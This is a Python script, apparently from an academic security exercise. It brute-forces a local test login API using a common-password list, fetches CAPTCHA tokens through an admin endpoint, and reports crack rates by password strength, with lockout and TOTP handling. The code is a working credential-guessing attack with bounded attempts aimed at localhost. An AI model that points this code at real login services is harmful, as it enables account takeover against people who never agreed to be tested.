import requests
import json
import time
from collections import defaultdict
import os
import psutil

SERVER_URL = 'http://localhost:5000/api/login'
USERS_FILE = os.path.join(os.path.dirname(__file__), '..', 'src', 'users.json')
PASSWORDS_FILE = os.path.join(os.path.dirname(__file__), '..', 'common_10k.txt')
MAX_ATTEMPTS = 50000   # each method
MAX_TOTAL_ATTEMPTS = 1000000
MAX_RUNTIME = 2 * 60 * 60  # 2 hours in seconds
ETHICS_DECLARATION = "This brute-force simulation was conducted for academic purposes, targeted only at an approved test server we created, and follows all declared security and ethical guidelines."
GROUP_SEED = 524392612


def cpu_memmory_usage():
    """ return CPU and memmory usage """
    return psutil.cpu_percent(), psutil.virtual_memory().percent

def load_users():
    """Load users from users.json file into usernames array"""
    with open(USERS_FILE, encoding='utf-8') as f:
        content = json.load(f)
    # extract usernames
    usernames = []
    for user in content.get("users", []):
        if isinstance(user, dict):
            usernames.append(user['username'])
        else:
            usernames.append(user)
    return usernames


def load_passwords():
    """Load common passwords from common_10k.txt file into passwords array"""
    with open(PASSWORDS_FILE, encoding='utf-8') as f:
        return [line.strip() for line in f.readlines() if line.strip()]
    

def get_category(username):
    """categorize each user by their password strength (format was created in the automation)"""
    if username.startswith('loaduser_weak_'):
        return 'weak'
    elif username.startswith('loaduser_medium_'):
        return 'medium'
    elif username.startswith('loaduser_strong_'):
        return 'strong'
    return 'other'

def handle_captcha(username, group_seed=GROUP_SEED):
    """ Fetch captcha_token (simulate test attacker) """
    response = requests.get(f'http://localhost:5000/admin/get_captcha_token?group_seed={group_seed}&username={username}')
    token = response.json().get('captcha_token')
    return token
    
def is_totp_required(resp_json):
    """ check if TOTP required """
    return (
        resp_json.get("success") and 
        resp_json.get("message", "").lower().find("totp required") > -1
        and resp_json.get("redirect") == "/totp-verify"
    )


def brute_force():
    users = load_users()
    passwords = load_passwords()

    summary = {
        "total_attempts": 0,
        "users": {},
        "by_category": defaultdict(list),
        "time_to_first_success": {},
        "attempts_per_second": 0,
        "start_time": time.time(),
        "avg_latency_by_hash": defaultdict(list),
        "cpu_usage": [],
        "mem_usage": [],
    }

    start_wall = time.time()
    total_attempts = 0
    successes = 0

    for user in users:
        print(f"\n[Username: {user}]")
        category = get_category(user)
        user_summary = {
            "attempts": 0,
            "cracked": False,
            "password_found": None,
            "time_to_success": None,
            "latencies": [],
            "responses": [],
            "totp_stopped": False

        }

        time_user_start = time.time()
        for idx, password in enumerate(passwords):
            if time.time() - start_wall > MAX_RUNTIME or total_attempts >= MAX_TOTAL_ATTEMPTS:
                print("[*] Stopped: Time or attempt bound reached.")
                break

            payload = {"username": user, "password": password}
            t0 = time.time()
            response = requests.post(SERVER_URL, json=payload)
            latency = (time.time() - t0) * 1000  # ms

            total_attempts += 1
            user_summary['attempts'] += 1
            user_summary['latencies'].append(latency)
            summary['cpu_usage'].append(psutil.cpu_percent())
            summary['mem_usage'].append(psutil.virtual_memory().percent)
            try:
                resp_json = response.json()
            except Exception:
                resp_json = {}


            # Handle CAPTCHA if needed
            if resp_json.get("captcha_required"):
                token = handle_captcha(user)
                payload["captcha_token"] = token
                t0 = time.time()
                response2 = requests.post(SERVER_URL, json=payload)
                latency2 = (time.time() - t0) * 1000 # ms
                user_summary['latencies'].append(latency2)
                user_summary['attempts'] += 1
                total_attempts += 1
                try:
                    resp_json = response2.json()
                except Exception:
                    resp_json = {}


            user_summary['responses'].append(resp_json)

            # STOP if user is locked permanently ("locked_forever" or error 423)
            if response.status_code == 423 or resp_json.get("message", "").lower().find("permanently locked") > -1:
                print(f"[!] {user} is permanently locked, stopping attempts.")
                break
            
            # success but blocked by TOTP 
            if is_totp_required(resp_json):
                print(f"[TOTP] User {user}: Password found ({password}) but blocked by TOTP. Stopping this user.")
                user_summary['cracked'] = True
                user_summary['password_found'] = password
                user_summary['totp_stopped'] = True
                user_summary['time_to_success'] = time.time() - time_user_start
                break

            # success
            if resp_json.get("success"):
                user_summary["cracked"] = True
                user_summary["password_found"] = password
                user_summary["time_to_success"] = time.time() - time_user_start
                print(f"[+] Success for {user}! Pass: {password}, Attempts: {user_summary['attempts']}")
                successes += 1
                break

            # Respect per-user attempt limits
            if user_summary['attempts'] >= MAX_ATTEMPTS:
                print(f'[~] Max attempts for user {user} has been reached.')
                break

        summary['users'][user] = user_summary
        summary['by_category'][category].append(user_summary)
        if user_summary.get("cracked") and not user_summary.get("totp_stopped"):
            summary["time_to_first_success"][user] = user_summary.get("time_to_success")

    duration_sec = time.time() - summary["start_time"]
    summary["total_attempts"] = total_attempts
    summary["attempts_per_second"] = total_attempts / duration_sec if duration_sec > 0 else 0
        
    # Calculate stats by hash mode / difficulty if needed
    for user, stats in summary['users'].items():
        if stats['latencies']:
            key = get_category(user)
            summary['avg_latency_by_hash'][key].extend(stats['latencies'])

    # Print full summary
    print("\n========== Brute Force Attack Summary ==========")

    for cat in ['weak', 'medium', 'strong']:
        l = summary['by_category'][cat]
        # count how many users from each category has been cracked 
        cracked = sum(1 for u in l if u['cracked'])
        totp_hits = sum(1 for u in l if u.get('totp_stopped'))
        print(f"{cat.capitalize()} users: Cracked {cracked - totp_hits}/{len(l)} cracked, {totp_hits} blocked by TOTP, ({(cracked/len(l))*100 if l else 0:.1f}% cracked+totp)")

    print(f"\nTotal attempts: {summary['total_attempts']}")
    print(f"Total time elapsed: {duration_sec:.1f} seconds")
    print(f"Attempts/sec: {summary['attempts_per_second']:.2f}")

    for cat, lats in summary['avg_latency_by_hash'].items():
        if lats:
            print(f"Avg latency ({cat}): {sum(lats)/len(lats):.1f} ms")
    min_time = min((t for t in summary['time_to_first_success'].values()), default=None)
    print(f"Quickest crack: {min_time:.2f}s" if min_time else "No user cracked.")
    print(f"Average CPU: {sum(summary['cpu_usage'])/len(summary['cpu_usage']):.1f}%, Average RAM: {sum(summary['mem_usage'])/len(summary['mem_usage']):.1f}%")

    #  Assessments for cracking other users
    print("\n=== Extrapolation ===")
    for cat in ['weak', 'medium', 'strong']:
        l = summary['by_category'][cat]
        total = len(l)
        successes = sum(1 for u in l if u['cracked'])
        rate = successes / total if total else 0
        attempts = sum(u['attempts'] for u in l)
        if successes == 0:
            print(f"Category {cat}: No success to calculate it out.")
            continue
        # estimate: if 0.4 success rate to crack 10 users in N attempts, estimate for all N passwords
        mean_attempts = attempts / successes
        est_for_full_keyspace = mean_attempts * (1 / rate) if rate != 0 else float('inf')
        print(f"{cat}: Extrapolated mean attempts for 100% crack: {est_for_full_keyspace:.1f}")

        

if __name__ == "__main__":
    brute_force()